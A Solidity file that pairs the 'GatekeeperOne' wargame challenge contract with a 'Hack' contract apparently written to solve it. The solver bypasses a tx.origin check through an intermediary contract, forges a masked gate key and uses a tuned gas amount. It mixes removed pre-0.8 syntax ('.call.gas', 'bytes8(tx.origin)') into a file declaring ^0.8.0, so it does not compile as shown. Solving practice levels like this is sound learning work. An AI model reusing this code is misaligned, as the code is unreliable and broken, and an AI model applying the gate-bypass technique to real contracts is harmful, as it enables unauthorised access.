// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

//Make it past the gatekeeper and register as an entrant to pass this level.
//Need to create contract so msg.sender != tx.origin for gateOne
//gasleft() % 8191 == 0

contract Hack {
    GatekeeperOne gate = GatekeeperOne(0xd9145CCE52D386f254917e481eB44e9943F39138);
    bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    function enterGate() public {
        gate.call.gas(56348)(bytes4(keccak256('enter(bytes8)')), key);
    }
}